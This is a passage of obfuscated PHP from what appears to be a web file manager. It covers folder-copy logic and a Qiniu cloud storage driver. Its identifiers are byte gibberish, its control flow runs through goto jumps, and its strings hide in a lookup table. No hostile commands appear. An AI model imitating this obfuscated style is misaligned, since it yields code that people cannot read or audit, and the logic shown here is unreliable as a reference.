Model($fÆ»½Õš±‰[533])->where($cÎÅÁ¶£ÁÈ)->delete(); goto FÃæ†ŠšÔ±; FÃæ†ŠšÔ±: } public function copyFolderFromIO($EÔÃ°¢¹É, $fÕ“•×”Œõ, $A†¢è³“Š‡, $bÁù«Ü¤², $Cñ³éÛ“ò, $dáã²‰›„¨ = false) { goto bËÛ—ÖÛŠ›; eˆˆìĞæ›: $this->updateModifyTime($A†¢è³“Š‡); return $b ––ÊåÕë; goto fÔ¢²¢ÌŸÆ; Cí±ß÷šäï: Model($Bòá÷Ú«“”[418])->linkAdd($c¿ÏÓ™Ã­œ[$Bòá÷Ú«“”[497]]); Model($Bòá÷Ú«“”[418])->remove($c¿ÏÓ™Ã­œ[$Bòá÷Ú«“”[534]]); $this->folderSizeReset($A†¢è³“Š‡); goto eˆˆìĞæ›; FÙÁ¦ó¥Ì: if ($d”ŠùÉŞ‹ö) { $this->_childrenAllMake($d”ŠùÉŞ‹ö); } Hook::trigger($Bòá÷Ú«“”[535]); $this->_copyChildTo($EÔÃ°¢¹É, $fÕ“•×”Œõ, $b ––ÊåÕë, $bÁù«Ü¤², $c¿ÏÓ™Ã­œ, $Cñ³éÛ“ò); goto añ¯²î…ø; bËÛ—ÖÛŠ›: $Bòá÷Ú«“” =& $_SERVER[Ö]; $c¿ÏÓ™Ã­œ = array($Bòá÷Ú«“”[498] => array(), $Bòá÷Ú«“”[499] => array(), $Bòá÷Ú«“”[497] => array(), $Bòá÷Ú«“”[534] => array()); $C×Ì¡­–Úç = $dáã²‰›„¨ ? $dáã²‰›„¨ : $EÔÃ°¢¹É->getPathName($EÔÃ°¢¹É->pathThis($fÕ“•×”Œõ)); goto eÂãˆ‡½ù; eÂãˆ‡½ù: $d”ŠùÉŞ‹ö = $this->fileNameExist($A†¢è³“Š‡, $C×Ì¡­–Úç); $b ––ÊåÕë = $this->mkdir($A†¢è³“Š‡, $C×Ì¡­–Úç, $bÁù«Ü¤²); if (!$d”ŠùÉŞ‹ö || $bÁù«Ü¤² == REPEAT_RENAME_FOLDER) { $bÁù«Ü¤² = !1; } goto FÙÁ¦ó¥Ì; añ¯²î…ø: Hook::trigger($Bòá÷Ú«“”[536]); if ($b ––ÊåÕë) { $this->folderSizeResetChildren($b ––ÊåÕë); } $this->_childrenListClear(); goto AâË—¸àÇ; AâË—¸àÇ: Model($Bòá÷Ú«“”[500])->addAll($c¿ÏÓ™Ã­œ[$Bòá÷Ú«“”[498]], array(), !0); Model($Bòá÷Ú«“”[501])->eventCopy($b ––ÊåÕë); $this->saveAll($c¿ÏÓ™Ã­œ[$Bòá÷Ú«“”[499]]); goto Cí±ß÷šäï; fÔ¢²¢ÌŸÆ: } private function _copyChildTo($eÏëÜˆóÛÛ, $ašššÜŸÙÃ, $C±é©£Ä—Œ, $DÊ¹Ú„ Ö·, &$E‘…­Í¦ˆä, $dçËªàæÄ) { goto F¤µõ’ñá´; B İÏ…´½ö: foreach ($Bá…›šçî  as &$b›—õ—é˜Ş) { goto b£ª¥æ¥¨—; BôÀè¡ê˜Ò: $b›—õ—é˜Ş[$BËÅùĞù£Î[77]] = _get($b›—õ—é˜Ş, $BËÅùĞù£Î[77], 0); $b›—õ—é˜Ş[$BËÅùĞù£Î[415]] = _get($b›—õ—é˜Ş, $BËÅùĞù£Î[415], 0); if (!isset($b›—õ—é˜Ş[$BËÅùĞù£Î[537]]) && $b›—õ—é˜Ş[$BËÅùĞù£Î[415]]) { $E‘…­Í¦ˆä[$BËÅùĞù£Î[534]][] = $b›—õ—é˜Ş[$BËÅùĞù£Î[415]]; } goto C¼ºÚ•‰’; C¼ºÚ•‰’: if ($DÊ¹Ú„ Ö·) { $BÆ´É„õ = $this->fileNameExistCache($C±é©£Ä—Œ, $b›—õ—é˜Ş[$BËÅùĞù£Î[28]]); if ($BÆ´É„õ) { if ($b›—õ—é˜Ş[$BËÅùĞù£Î[366]] || $DÊ¹Ú„ Ö· == REPEAT_SKIP) { continue; } if ($DÊ¹Ú„ Ö· == REPEAT_REPLACE) { $D‘òÄŸŒ„ã = $this->sourceInfoCache($BÆ´É„õ); $a¼‡â‹¥º“ = $this->fileHistory($D‘òÄŸŒ„ã, $b›—õ—é˜Ş[$BËÅùĞù£Î[415]], $b›—õ—é˜Ş[$BËÅùĞù£Î[77]]); if ($a¼‡â‹¥º“) { $E‘…­Í¦ˆä[$BËÅùĞù£Î[497]][] = $b›—õ—é˜Ş[$BËÅùĞù£Î[415]]; } continue; } else { if ($DÊ¹Ú„ Ö· == REPEAT_RENAME) { $b›—õ—é˜Ş[$BËÅùĞù£Î[28]] = $this->fileNameAutoCache($C±é©£Ä—Œ, $b›—õ—é˜Ş[$BËÅùĞù£Î[28]], $DÊ¹Ú„ Ö·, !1); } } } } if (!$b›—õ—é˜Ş[$BËÅùĞù£Î[366]] && $b›—õ—é˜Ş[$BËÅùĞù£Î[415]]) { $E‘…­Í¦ˆä[$BËÅùĞù£Î[497]][] = $b›—õ—é˜Ş[$BËÅùĞù£Î[415]]; } $eÎè—×ŞƒÏ[] = $this->_makeItemData($b›—õ—é˜Ş, $Dä—‰ ½İœ, $b›—õ—é˜Ş[$BËÅùĞù£Î[28]]); goto d‰¨²¸Æ–Ë; b£ª¥æ¥¨—: if (isset($A§½¡éŠ[$b›—õ—é˜Ş[$BËÅùĞù£Î[28]]])) { $b›—õ—é˜Ş = $A§½¡éŠ[$b›—õ—é˜Ş[$BËÅùĞù£Î[28]]]; } $b›—õ—é˜Ş[$BËÅùĞù£Î[366]] = $b›—õ—é˜Ş[$BËÅùĞù£Î[29]] == $BËÅùĞù£Î[76]; $b›—õ—é˜Ş[$BËÅùĞù£Î[368]] = _get($b›—õ—é˜Ş, $BËÅùĞù£Î[156], $BËÅùĞù£Î[33]); goto BôÀè¡ê˜Ò; d‰¨²¸Æ–Ë: } unset($b›—õ—é˜Ş); if (!empty($eÎè—×ŞƒÏ)) { $this->addAll($eÎè—×ŞƒÏ); } goto Fğ­×“¯–©; Fğ­×“¯–©: $aÆ™Ÿ§Ì‡Œ = $this->_childrenList($C±é©£Ä—Œ); $aÆ™Ÿ§Ì‡Œ = array_to_keyvalue($aÆ™Ÿ§Ì‡Œ, $BËÅùĞù£Î[28]); foreach ($Bá…›šçî  as $b›—õ—é˜Ş) { $D‘òÄŸŒ„ã = $aÆ™Ÿ§Ì‡Œ[$b›—õ—é˜Ş[$BËÅùĞù£Î[28]]]; $CŠö®¤»ï = $D‘òÄŸŒ„ã[$BËÅùĞù£Î[365]]; $this->_copyApplyMeta($D‘òÄŸŒ„ã, $E‘…­Í¦ˆä); if ($b›—õ—é˜Ş[$BËÅùĞù£Î[29]] == $BËÅùĞù£Î[76]) { $b›—õ—é˜Ş[$BËÅùĞù£Î[75]] = $eÏëÜˆóÛÛ->getPathInner($b›—õ—é˜Ş[$BËÅùĞù£Î[75]]); $this->_copyChildTo($eÏëÜˆóÛÛ, $b›—õ—é˜Ş[$BËÅùĞù£Î[75]], $CŠö®¤»ï, $DÊ¹Ú„ Ö·, $E‘…­Í¦ˆä, $dçËªàæÄ); } } goto c¥‰ˆ‡İ¿”; F¤µõ’ñá´: $BËÅùĞù£Î =& $_SERVER[Ö]; $Dä—‰ ½İœ = $this->sourceInfoCache($C±é©£Ä—Œ); $C‰¢Ê´»‘² = $eÏëÜˆóÛÛ->listPath($ašššÜŸÙÃ, !1, !0); goto eğ»Ö÷ªĞŸ; eğ»Ö÷ªĞŸ: $Bá…›šçî  = array_merge($C‰¢Ê´»‘²[$BËÅùĞù£Î[73]], $C‰¢Ê´»‘²[$BËÅùĞù£Î[74]]); $A§½¡éŠ = $this->_addFiles($eÏëÜˆóÛÛ, $C‰¢Ê´»‘²[$BËÅùĞù£Î[73]], $dçËªàæÄ); $eÎè—×ŞƒÏ = array(); goto B İÏ…´½ö; c¥‰ˆ‡İ¿”: } private function _addFiles($bäš¬ô´áÉ, $a›øåµØŞ, $aåÎª‚Ì†„) { goto e¨Í¬±Òçï; Eíø’’à: $b½†ÎŒ°Îğ = $EÔÓË‰İÕ->where($B©¿ğÀù)->select(); $b½†ÎŒ°Îğ = $b½†ÎŒ°Îğ ? $b½†ÎŒ°Îğ : array(); foreach ($b½†ÎŒ°Îğ as $FïŒ¶ØÇê) { if (!isset($AøÙËÅùâ×[$FïŒ¶ØÇê[$D‚™¹å†„Å[159]]])) { continue; } $e°š˜æÃ«È = $AøÙËÅùâ×[$FïŒ¶ØÇê[$D‚™¹å†„Å[159]]]; foreach ($e°š˜æÃ«È as &$C—Ì“ãï¾) { $C—Ì“ãï¾[$D‚™¹å†„Å[415]] = $FïŒ¶ØÇê[$D‚™¹å†„Å[415]]; $C—Ì“ãï¾[$D‚™¹å†„Å[537]] = !0; } unset($C—Ì“ãï¾); } goto c°‚İ‡ïÛÂ; c°‚İ‡ïÛÂ: $f¾´â–ëïĞ = array(); foreach ($a›øåµØŞ as $b˜á´¾¤±…) { if (isset($b˜á´¾¤±…[$D‚™¹å†„Å[537]]) && $b˜á´¾¤±…[$D‚™¹å†„Å[537]]) { continue; } $F©“ÂÉî¯ = $bäš¬ô´áÉ->getPathInner($b˜á´¾¤±…[$D‚™¹å†„Å[75]]); $eÅ“µ®´Ø = $EÔÓË‰İÕ->addFileMake($F©“ÂÉî¯, $b˜á´¾¤±…[$D‚™¹å†„Å[77]], $b˜á´¾¤±…[$D‚™¹å†„Å[160]], $b˜á´¾¤±…[$D‚™¹å†„Å[159]], $b˜á´¾¤±…[$D‚™¹å†„Å[28]], $aåÎª‚Ì†„); $f¾´â–ëïĞ[] = $eÅ“µ®´Ø; } $EÔÓË‰İÕ->addAll($f¾´â–ëïĞ); goto aˆÔîÊÔˆõ; aˆÔîÊÔˆõ: $B©¿ğÀù = array($D‚™¹å†„Å[159] => array($D‚™¹å†„Å[7], array_keys($AøÙËÅùâ×))); $b½†ÎŒ°Îğ = $EÔÓË‰İÕ->where($B©¿ğÀù)->select(); $b½†ÎŒ°Îğ = $b½†ÎŒ°Îğ ? $b½†ÎŒ°Îğ : array(); goto d“ÈµÛçŠ; d“ÈµÛçŠ: foreach ($b½†ÎŒ°Îğ as $FïŒ¶ØÇê) { if (!isset($AøÙËÅùâ×[$FïŒ¶ØÇê[$D‚™¹å†„Å[159]]])) { continue; } $e–×²¶Âø =& $AøÙËÅùâ×[$FïŒ¶ØÇê[$D‚™¹å†„Å[159]]]; foreach ($e–×²¶Âø as &$C—Ì“ãï¾) { $C—Ì“ãï¾[$D‚™¹å†„Å[415]] = $FïŒ¶ØÇê[$D‚™¹å†„Å[415]]; } unset($C—Ì“ãï¾); } $A¿îãçÁ™ = array(); foreach ($a›øåµØŞ as $A¢ÓíÀ÷çã) { $A¿îãçÁ™[$A¢ÓíÀ÷çã[$D‚™¹å†„Å[28]]] = $A¢ÓíÀ÷çã; } goto fÍƒ¿›ÁÊ‰; e¨Í¬±Òçï: $D‚™¹å†„Å =& $_SERVER[Ö]; if (!$a›øåµØŞ || count($a›øåµØŞ) == 0) { return array(); } $AøÙËÅùâ× = array(); goto BàäàÏÍÚ; fÍƒ¿›ÁÊ‰: return $A¿îãçÁ™; goto D¨òî±‡Î; BàäàÏÍÚ: foreach ($a›øåµØŞ as &$C—Ì“ãï¾) { goto e‹Ÿ’Ø¶ÕÉ; Bå²‘ĞÜø‹: $E»ÃÃö…àå = $bäš¬ô´áÉ->hashMd5($C—Ì“ãï¾[$D‚™¹å†„Å[75]]); if (strlen($E»ÃÃö…àå) > 10 && !isset($AøÙËÅùâ×[$E»ÃÃö…àå])) { $AøÙËÅùâ×[$E»ÃÃö…àå] = array(); } $C—Ì“ãï¾[$D‚™¹å†„Å[160]] = $dñ¿¦ª®¾Ï; goto Dö›µ´ö£; DéÃÕª™À‹: if (count($AøÙËÅùâ×[$E»ÃÃö…àå]) > 1) { $C—Ì“ãï¾[$D‚™¹å†„Å[537]] = !0; } goto D‘Ù‚—¢½; Dö›µ´ö£: $C—Ì“ãï¾[$D‚™¹å†„Å[159]] = $E»ÃÃö…àå; Hook::trigger($D‚™¹å†„Å[539], $C—Ì“ãï¾); $AøÙËÅùâ×[$E»ÃÃö…àå][] =& $C—Ì“ãï¾; goto DéÃÕª™À‹; e‹Ÿ’Ø¶ÕÉ: Hook::trigger($D‚™¹å†„Å[538], $C—Ì“ãï¾); $C—Ì“ãï¾[$D‚™¹å†„Å[75]] = $bäš¬ô´áÉ->getPathInner($C—Ì“ãï¾[$D‚™¹å†„Å[75]]); $dñ¿¦ª®¾Ï = $bäš¬ô´áÉ->hashSimple($C—Ì“ãï¾[$D‚™¹å†„Å[75]]); goto Bå²‘ĞÜø‹; D‘Ù‚—¢½: } $B©¿ğÀù = array($D‚™¹å†„Å[159] => array($D‚™¹å†„Å[7], array_keys($AøÙËÅùâ×))); $EÔÓË‰İÕ = Model($D‚™¹å†„Å[540]); goto Eíø’’à; D¨òî±‡Î: } } define($_SERVER[Ö][541], $_SERVER[Ö][542]); goto fƒ‰é¦ßÄß; eğÕİÌ•ŸÜ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($eï¦§è…½) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ö][1197]; $this->_init($eï¦§è…½); } public function _init($B¤®¤Œ—Ö¢) { foreach ($B¤®¤Œ—Ö¢ as $fğĞéãÚ¿¯ => $Bğ÷±çïÖ) { if (isset($this->{$fğĞéãÚ¿¯})) { $this->{$fğĞéãÚ¿¯} = $Bğ÷±çïÖ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Ö][1198], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($EÒá‚õà®¨, $cªƒ‘éÉÊé = '', $bãœ”†¸Ú = REPEAT_RENAME) { if ($this->setContent($EÒá‚õà®¨, $cªƒ‘éÉÊé)) { return $this->getPathOuter($EÒá‚õà®¨); } return !1; } public function mkdir($Bê®’õ¥âì, $BôŞ×Œ¥‡Ç = REPEAT_SKIP) { goto a‰ºÏĞ±; a‰ºÏĞ±: $a‹§‹â„Îø =& $_SERVER[Ö]; $BºèÛ¤»êŠ = trim($Bê®’õ¥âì, $a‹§‹â„Îø[8]); if ($this->_isFolder($BºèÛ¤»êŠ)) { return $this->getPathOuter($BºèÛ¤»êŠ); } goto c¬‡ë©Ì; c¬‡ë©Ì: $Bê®’õ¥âì = $BºèÛ¤»êŠ . $a‹§‹â„Îø[8]; $d©§ËøÙæÅ = get_path_this($BºèÛ¤»êŠ); $F½È÷ˆäğŠ = $Bê®’õ¥âì . $d©§ËøÙæÅ; goto Fƒé‚ØÊ½™; Fƒé‚ØÊ½™: if (!$this->mkfile($F½È÷ˆäğŠ)) { return !1; } if (!$this->moveFile($F½È÷ˆäğŠ, $Bê®’õ¥âì)) { $this->delFile($F½È÷ˆäğŠ); return !1; } return $this->getPathOuter($BºèÛ¤»êŠ); goto fÒ“Í—»¿õ; fÒ“Í—»¿õ: } public function copyFile($aÃ÷ëµ‘Ï, $c¢Ì†³ ñ¶) { $bñ—ÕÈÅ†¢ = $this->bucketManager->copy($this->bucket, $aÃ÷ëµ‘Ï, $this->bucket, $c¢Ì†³ ñ¶, !0); return $bñ—ÕÈÅ†¢ ? !1 : !0; } public function moveFile($bîçàËÈ±Ÿ, $A·ßøÆšä‚) { $DÊò¯¦ïÇ‘ = $this->bucketManager->move($this->bucket, $bîçàËÈ±Ÿ, $this->bucket, $A·ßøÆšä‚, !0); return $DÊò¯¦ïÇ‘ ? !1 : !0; } public function delFile($cĞ›ø ˆ™) { $D°†äóÍ‘ = $this->bucketManager->delete($this->bucket, $cĞ›ø ˆ™); return $D°†äóÍ‘ ? !1 : !0; } public function delFolder($eŒší×¤›œ) { $f³šªÏöêå = $this->fileList($eŒší×¤›œ); if (empty($f³šªÏöêå)) { return !0; } $A¯†ï†Ó…¦ = 1000; if (count($f³šªÏöêå) <= $A¯†ï†Ó…¦) { return $this->qnDelObj($f³šªÏöêå) ? !1 : !0; } foreach (array_chunk($f³šªÏöêå, $A¯†ï†Ó…¦) as $A÷ñíìÎ‚¿) { $eåİé‹ä¥İ = $this->qnDelObj($A÷ñíìÎ‚¿); if ($eåİé‹ä¥İ) { return !1; } } return !0; } private function qnDelObj($DŠô¦ÔÂŠ’) { $aÈğí†’ŠÒ = $this->bucketManager->buildBatchDelete($this->bucket, $DŠô¦ÔÂŠ’); list($F‹‘†“Š®, $BµùØ´Œ…ì) = $this->bucketManager->batch($aÈğí†’ŠÒ); return $BµùØ´Œ…ì; } private function fileList($bàˆ¡°ÆÛó, $dâ‰Ş‘ÔÃÕ = 0) { goto f¸ö¯½«¼Ó; cÔ‚àêâ†”: $cè¹Úæ±ß = array(); while (!0) { list($f¸ÃÆ£™š, $C™¢Ïëµ­Ü) = $this->bucketManager->listFiles($this->bucket, $A²ÒàĞ‹ã³, $BÓ»ˆŠŠ‘Ç, $bƒ‰Àâ‡Õ¶, $e—â’·…‹); if ($C™¢Ïëµ­Ü) { return !1; } $BÓ»ˆŠŠ‘Ç = array_key_exists($dÂñšóŞ„Š[1168], $f¸ÃÆ£™š) ? $BÓ»ˆŠŠ‘Ç = $f¸ÃÆ£™š[$dÂñšóŞ„Š[1199]] : $dÂñšóŞ„Š[33]; foreach ($f¸ÃÆ£™š[$dÂñšóŞ„Š[1200]] as $a…´îÈŠ‚) { $e¨÷Íé¢ôè = $a…´îÈŠ‚[$dÂñšóŞ„Š[89]]; if ($dâ‰Ş‘ÔÃÕ) { $e¨÷Íé¢ôè = array($dÂñšóŞ„Š[28] => $e¨÷Íé¢ôè, $dÂñšóŞ„Š[77] => $a…´îÈŠ‚[$dÂñšóŞ„Š[1201]]); } $cè¹Úæ±ß[] = $e¨÷Íé¢ôè; } if ($BÓ»ˆŠŠ‘Ç == $dÂñšóŞ„Š[33]) { break; } } return $cè¹Úæ±ß; goto bİ•¡Ñ™«; FÃ¶ÓœÔ‚·: $BÓ»ˆŠŠ‘Ç = $dÂñšóŞ„Š[33]; $bƒ‰Àâ‡Õ¶ = 1000; $e—â’·…‹ = $dÂñšóŞ„Š[33]; goto cÔ‚àêâ†”; f¸ö¯½«¼Ó: $dÂñšóŞ„Š =& $_SERVER[Ö]; $bàˆ¡°ÆÛó = trim($bàˆ¡°ÆÛó, $dÂñšóŞ„Š[8]); $A²ÒàĞ‹ã³ = empty($bàˆ¡°ÆÛó) ? $dÂñšóŞ„Š[33] : $bàˆ¡°ÆÛó . $dÂñšóŞ„Š[8]; goto FÃ¶ÓœÔ‚·; bİ•¡Ñ™«: } public function rename($Eè•²µ°, $e¾õ¼ÌéÏï) { return $this->renameObject($Eè•²µ°, $e¾õ¼ÌéÏï); } public function fileInfo($AìÙ¬¯ÔëÏ, $e³ƒ²ÎËëÍ = false, $eÁ¿ƒªøÔà = array()) { goto F§Òæ†º ì; aĞÂ©ƒ®ğ¡: if (empty($eÁ¿ƒªøÔà)) { $eÁ¿ƒªøÔà = $this->objectMeta($AìÙ¬¯ÔëÏ); if (!$eÁ¿ƒªøÔà) { return $F»ÒŸŠéºğ; } } if (isset($eÁ¿ƒªøÔà[$fâ¯Çé»´Ø[1202]])) { $F»ÒŸŠéºğ[$fâ¯Çé»´Ø[183]] = $eÁ¿ƒªøÔà[$fâ¯Çé»´Ø[1202]]; } if (isset($eÁ¿ƒªøÔà[$fâ¯Çé»´Ø[1201]])) { $F»ÒŸŠéºğ[$fâ¯Çé»´Ø[77]] = $eÁ¿ƒªøÔà[$fâ¯Çé»´Ø[1201]]; } goto B½‡ÅÄùÅ¢; F§Òæ†º ì: $fâ¯Çé»´Ø =& $_SERVER[Ö]; if ($e³ƒ²ÎËëÍ) { return array($fâ¯Çé»´Ø[28] => $this->pathThis($AìÙ¬¯ÔëÏ), $fâ¯Çé»´Ø[75] => $this->getPathOuter($fâ¯Çé»´Ø[8] . $AìÙ¬¯ÔëÏ), $fâ¯Çé»´Ø[29] => $fâ¯Çé»´Ø[163], $fâ¯Çé»´Ø[77] => isset($eÁ¿ƒªøÔà[$fâ¯Çé»´Ø[1201]]) ? $eÁ¿ƒªøÔà[$fâ¯Çé»´Ø[1201]] : 0, $fâ¯Çé»´Ø[156] => $this->ext($AìÙ¬¯ÔëÏ)); } $F»ÒŸŠéºğ = array($fâ¯Çé»´Ø[28] => $this->pathThis($AìÙ¬¯ÔëÏ), $fâ¯Çé»´Ø[75] => $this->getPathOuter($fâ¯Çé»´Ø[8] . $AìÙ¬¯ÔëÏ), $fâ¯Çé»´Ø[29] => $fâ¯Çé»´Ø[163], $fâ¯Çé»´Ø[183] => 0, $fâ¯Çé»´Ø[106] => 0, $fâ¯Çé»´Ø[77] => 0, $fâ¯Çé»´Ø[156] => $this->ext($AìÙ¬¯ÔëÏ), $fâ¯Çé»´Ø[184] => !0, $fâ¯Çé»´Ø[185] => !0); goto aĞÂ©ƒ®ğ¡; B½‡ÅÄùÅ¢: return $F»ÒŸŠéºğ; goto aÈÏ¨¶š™; aÈÏ¨¶š™: } public function folderInfo($eÂÈ–Ş±›Œ, $b’ËìŠ› š = false) { goto B‡æË‚š•à; bãÔèˆÁ´: $eÂÈ–Ş±›Œ = rtrim($eÂÈ–Ş±›Œ, $BÍ­Š£Ëö[8]) . $BÍ­Š£Ëö[8]; $EÀÍ·ëº¢Î = $this->objectMeta($eÂÈ–Ş±›Œ); if (isset($EÀÍ·ëº¢Î[$BÍ­Š£Ëö[1202]])) { $E‡ÆæöŒÓ[$BÍ­Š£Ëö[183]] = $EÀÍ·ëº¢Î[$BÍ­Š£Ëö[1202]]; } goto aˆ”’ĞÉ†ì; B‡æË‚š•à: $BÍ­Š£Ëö =& $_SERVER[Ö]; if ($b’ËìŠ› š) { return array($BÍ­Š£Ëö[28] => $this->pathThis($eÂÈ–Ş±›Œ), $BÍ­Š£Ëö[75] => $this->getPathOuter($BÍ­Š£Ëö[8] . $eÂÈ–Ş±›Œ), $BÍ­Š£Ëö[29] => $BÍ­Š£Ëö[76]); } $E‡ÆæöŒÓ = array($BÍ­Š£Ëö[28] => $this->pathThis($eÂÈ–Ş±›Œ), $BÍ­Š£Ëö[75] => $this->getPathOuter($BÍ­Š£Ëö[8] . $eÂÈ–Ş±›Œ), $BÍ­Š£Ëö[29] => $BÍ­Š£Ëö[76], $BÍ­Š£Ëö[183] => 0, $BÍ­Š£Ëö[106] => 0, $BÍ­Š£Ëö[1147] => !0, $BÍ­Š£Ëö[1148] => !0); goto bãÔèˆÁ´; aˆ”’ĞÉ†ì: return $E‡ÆæöŒÓ; goto bºîóƒ“ä; bºîóƒ“ä: } public function listPath($BÏ÷’ÉŒŸ¨, $cÊÓ‰†›—¶ = false) { goto bŒìÆªÎØ¦; eŠ¿ö¿Åñ: $DÜ±«±±  = $d½¿Š…Í–‹[33]; $eë­ ÜÇÊ = 1000; $A½‚ªóöàŠ = $d½¿Š…Í–‹[8]; goto EâÃèÔì•¢; EâÃèÔì•¢: $e¹ƒ±«Ìˆ­ = $bÍ›®êÍìĞ = array(); while (!0) { list($EÂÕÊÌ³„á, $bæ¡™¯æøÓ) = $this->bucketManager->listFiles($this->bucket, $b·òñ…‘ğ‚, $DÜ±«±± , $eë­ ÜÇÊ, $A½‚ªóöàŠ); if ($bæ¡™¯æøÓ) { return !1; } $DÜ±«±±  = array_key_exists($d½¿Š…Í–‹[1168], $EÂÕÊÌ³„á) ? $DÜ±«±±  = $EÂÕÊÌ³„á[$d½¿Š…Í–‹[1199]] : $d½¿Š…Í–‹[33]; if (isset($EÂÕÊÌ³„á[$d½¿Š…Í–‹[1203]])) { foreach ($EÂÕÊÌ³„á[$d½¿Š…Í–‹[1203]] as $F›æ‹à„«) { if ($F›æ‹à„« == $b·òñ…‘ğ‚) { continue; } $e¹ƒ±«Ìˆ­[] = $this->folderInfo($F›æ‹à„«, $cÊÓ‰†›—¶); } } if (isset($EÂÕÊÌ³„á[$d½¿Š…Í–‹[1200]])) { foreach ($EÂÕÊÌ³„á[$d½¿Š…Í–‹[1200]] as $døíÓ÷•®Ø) { if ($døíÓ÷•®Ø[$d½¿Š…Í–‹[89]] == $b·òñ…‘ğ‚) { continue; } $bÍ›®êÍìĞ[] = $this->fileInfo($døíÓ÷•®Ø[$d½¿Š…Í–‹[89]], $cÊÓ‰†›—¶, $døíÓ÷•®Ø); } } if ($DÜ±«±±  == $d½¿Š…Í–‹[33]) { break; } } return array($d½¿Š…Í–‹[74] => $e¹ƒ±«Ìˆ­, $d½¿Š…Í–‹[73] => $bÍ›®êÍìĞ); goto c–øÃåÁãÜ; bŒìÆªÎØ¦: $d½¿Š…Í–‹ =& $_SERVER[Ö]; $BÏ÷’ÉŒŸ¨ = trim($BÏ÷’ÉŒŸ¨, $d½¿Š…Í–‹[8]); $b·òñ…‘ğ‚ = empty($BÏ÷’ÉŒŸ¨) ? $d½¿Š…Í–‹[33] : $BÏ÷’ÉŒŸ¨ . $d½¿Š…Í–‹[8]; goto eŠ¿ö¿Åñ; c–øÃåÁãÜ: } public function has($D­°Õ¬”ôÍ, $Aé¤Ìƒ„„ = false, $B¡éäã§îõ = true) { goto fåÇÏ”°ˆô; C¢å¥Ïš†: $BÈ†¼•â¤ = 0; $aáğ…°èÖ = 0; while (!0) { list($A‡‡Œ«ëÂ‘, $bİ°Êæ§„‚) = $this->bucketManager->listFiles($this->bucket, $A³±ÀÎÂ¿¥, $fºš¿Ë™, $Eù§‡ŒÜæ, $BåËå²ÁÆ); if ($bİ°Êæ§„‚) { return !1; } $fºš¿Ë™ = array_key_exists($aöÆĞ¶—õË[1168], $A‡‡Œ«ëÂ‘) ? $fºš¿Ë™ = $A‡‡Œ«ëÂ‘[$aöÆĞ¶—õË[1199]] : $aöÆĞ¶—õË[33]; if ($Aé¤Ìƒ„„) { if (!empty($A‡‡Œ«ëÂ‘[$aöÆĞ¶—õË[1200]])) { $BÈ†¼•â¤ += count($A‡‡Œ«ëÂ‘[$aöÆĞ¶—õË[1200]]); } if (!empty($A‡‡Œ«ëÂ‘[$aöÆĞ¶—õË[1203]])) { $aáğ…°èÖ += count($A‡‡Œ«ëÂ‘[$aöÆĞ¶—õË[1203]]); } if ($fºš¿Ë™ === $aöÆĞ¶—õË[33]) { break; } continue; } if ($B¡éäã§îõ) { if (!empty($A‡‡Œ«ëÂ‘[$aöÆĞ¶—õË[1200]])) { return !0; } } else { if (!empty($A‡‡Œ«ëÂ‘[$aöÆĞ¶—õË[1203]])) { return !0; } } if ($fºš¿Ë™ == $aöÆĞ¶—õË[33]) { break; } } goto cèïõÇÆÁ¯; BÀÌÈ§ö¼ñ: $fºš¿Ë™ = $aöÆĞ¶—õË[33]; $Eù§‡ŒÜæ = 1000; $BåËå²ÁÆ = $aöÆĞ¶—õË[8]; goto C¢å¥Ïš†; fåÇÏ”°ˆô: $aöÆĞ¶—õË =& $_SERVER[Ö]; $D­°Õ¬”ôÍ = trim($D­°Õ¬”ôÍ, $aöÆĞ¶—õË[8]); $A³±ÀÎÂ¿¥ = empty($D­°Õ¬”ôÍ) ? $aöÆĞ¶—õË[33] : $D­°Õ¬”ôÍ . $aöÆĞ¶—õË[8]; goto BÀÌÈ§ö¼ñ; cèïõÇÆÁ¯: if ($Aé¤Ìƒ„„) { return array($aöÆĞ¶—õË[187] => $BÈ†¼•â¤, $aöÆĞ¶—õË[188] => $aáğ…°èÖ); } return !1; goto f•İ¡Û–ˆ; f•İ¡Û–ˆ: } public function listAll($fì‘ÍÔ°éÔ) { $Fº÷§ ‰ğ =& $_SERVER[Ö]; $b¸Š‹ñËñ = $this->fileList($fì‘ÍÔ°éÔ, 1); $AÅ‘¶Ì‡ëÍ = array(); foreach ($b¸Š‹ñËñ as $bŸ½Ş‘Ï‘½) { $AÅ‘¶Ì‡ëÍ[$bŸ½Ş‘Ï‘½[$Fº÷§ ‰ğ[28]]] = $bŸ½Ş‘Ï‘½[$Fº÷§ ‰ğ[77]]; } return $this->listAllFiles($fì‘ÍÔ°éÔ, array_keys($AÅ‘¶Ì‡ëÍ), $AÅ‘¶Ì‡ëÍ); } public function canRead($A¨‡Íòïƒâ) { return $this->exist($A¨‡Íòïƒâ) ? !0 : !1; } public function canWrite($E…Ì«ºíÑ™) { return $this->exist($E…Ì«ºíÑ™) ? !0 : !1; } public function getContent($D¥ÄÛ¼ŸÖÒ) { return $this->fileSubstr($D¥ÄÛ¼ŸÖÒ, 0, -1); } public function setContent($Cè¼ã¼Õ«, $FŠµñÅó¯Í = '') { $AŸÄšï©Ê² = $this->tempFile($this->pathThis($Cè¼ã¼Õ«)); file_put_contents($AŸÄšï©Ê², $FŠµñÅó¯Í); if ($this->upload($Cè¼ã¼Õ«, $AŸÄšï©Ê²)) { $this->tempFileRemve($AŸÄšï©Ê²); return !0; } return !1; } public function refreshUrls($F³èò¿”Şâ) { goto aÀÁóë¢Ñê; C‚£«ñÉÓÕ: return $AÇÂ¾ÃêÀÕ[$dÔ“ßÅîœ³[1204]] == $dÔ“ßÅîœ³[689] ? !0 : !1; goto fŒÌÚÓÑÄ£; aÀÁóë¢Ñê: $dÔ“ßÅîœ³ =& $_SERVER[Ö]; $e²†ß•ÖÆ = array(); if (is_array($F³èò¿”Şâ)) { foreach ($F³èò¿”Şâ as $CˆÚøöóê) { 